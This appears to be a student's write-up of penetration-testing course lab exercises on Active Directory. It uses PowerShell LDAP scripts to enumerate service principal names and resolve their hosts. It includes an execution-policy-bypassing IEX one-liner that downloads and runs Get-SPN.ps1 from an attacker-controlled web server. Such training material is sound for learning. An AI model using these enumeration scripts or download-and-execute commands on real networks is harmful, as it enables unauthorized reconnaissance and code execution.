21.2.5.2

# 21.2.5.2.1. Repeat the steps from this section to discover the service principal name for the IIS server.

Log on as domain user corp\offsec
![a70411476cb80c680ffe1a122c4f0e1a.png](72716c5c7c924e82810c065cf0c5e38c.png)

Open command prompt as administrator
![2d9cfc70f7d1c7930dc7b8e9c5df1938.png](2928e5d5421c4ef08fabf8fba7b78a57.png)

Allow this app to make changes to your device
![b774ae9b9be81611fdf9e060cc513b26.png](1dcbcb0a3fa44e5ab448faf48cb4dbc4.png)

Ensure the Execution-Policy is Unrestricted
![ee14056eb92331d4cbda3aab4296953c.png](a5aeeff555c343c4ba87f52be8d7d085.png)

Here is a powershell script to detect registered service principal names
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```
![2d6839cdffc85062a22d3f6db2d202c3.png](b38c6f7f5e994819a4eb831fd1e32283.png)

Run the powershell script to detect registered service principal names. The relevant information is the samaccountname `iis_service` and the serviceprincipalname `HTTP/CorpWebServer.corp.com`
![33841217d993c06017e81020b30f0b0e.png](f79968e9abfa4ec1ad314f9e3e7aac7a.png)

Resolve CorpWebServer.corp.com via lookup. We see that the hostname resolves to an internal IP address (the domain controller address 172.16.214.5)
`nslookup CorpWebServer.corp.com`
![0f831128c5e3f70037a4be2e3392826b.png](6818bcc2fed6482e80f72c9c6fcc4c0f.png)

Browse IP address `corpwebserver.corp.com`
![0f5bc657e2cdac546c2d4de6aa211f07.png](cca591207f464150844dc4db9103325e.png)



# 21.2.5.2.2. Discover any additional registered service principal names in the domain.

Modify the script to find all registered SPNs
```powershell
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat detectAllSPNs.ps1 
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Write-Host "samaccountname      :" $obj.Properties.samaccountname
    Write-Host "serviceprincipalname:" $obj.Properties.serviceprincipalname
    Write-Host "-----------------------------------"
}
```

Run the script. In addition to HTTP/CorpWebServer.corp.com, we see 4 more service principal names:
![ff5a197450f2b0303b7cb89fb16bb86b.png](5a3f6ec9fa094b7681923a5ba8491700.png)



# 21.2.5.2.3. Update the script so the result includes the IP address of any servers where a service principal name is registered.

This script will list possible servers, then perform an nslookup
```powershell
kali@kali:~/gitWorkspace/pwk/oscpExercises/21_activeDirectoryAttacks$ cat getSpnIpAddresses.ps1 
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*"
$Result = $Searcher.FindAll()
$IpArray = @()
Foreach($obj in $Result)
{
    # Write-Host "serviceprincipalname:" $obj.Properties.serviceprincipalname
    $inputString = $obj.Properties.serviceprincipalname
    $SpnArray = $InputString.Split(" ").Split("/")
    Foreach($obj in $SpnArray)
    {
        If ($obj -match '.corp.com' -and $IpArray -notcontains $obj)  {
            # $obj
            $IpArray += $obj
        }
    }
}

Write-Host "---------- List of SPN server names ----------"
$IpArray

Write-Host "---------- nslookup ----------" 
Foreach($i in $IpArray)
{
    Write-Host "Performing nslookup for $i ...."
    nslookup $i.Split(":")[0]
}
```

Output. I see an IP address for DomainDnsZones.com and ForestDnsZones.corp.com which resolve to 172.16.121.5.
![6f0f74bc20958840f547b5686e8a53d3.png](d3620bd658e944689d0c6ef0979ddc58.png)
![9f17178edca32ed0c1ecba8af82afb43.png](a5a3ec2a27b6468e9750e63746ac9d93.png)


# 21.2.5.2.4. Use the Get-SPN script and rediscover the same service principal names.

Locate the script then transfer to Kali Apache Web server. Restart Web server. 
![ba451e5a0dd2197f03743544d15b4fd7.png](b976022d00ee42f69b5ca5ad90cf3d38.png)

Download the Get-SPN.ps1 script to the Windows client
`powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.214/Get-SPN.ps1')"`

Run the Get-SPN script to look for all SPNs. We get the same SPNs as from our script.
`PS C:\Users\offsec\Desktop> Get-SPN -type service -search "*"`
![2f50362f0f3dfcb2e16f67453600b745.png](b1c60eded0b447a28061a67b834bc4a9.png)
![73a5d3e4538eb1534b2d94f2dbf37fd2.png](5eceb8d7220c400db3049d0a8d4aa61f.png)
![73d4577654b0edf447d7c32846dae8f4.png](90934f8ad0a14ac598ec6d9844de4da7.png)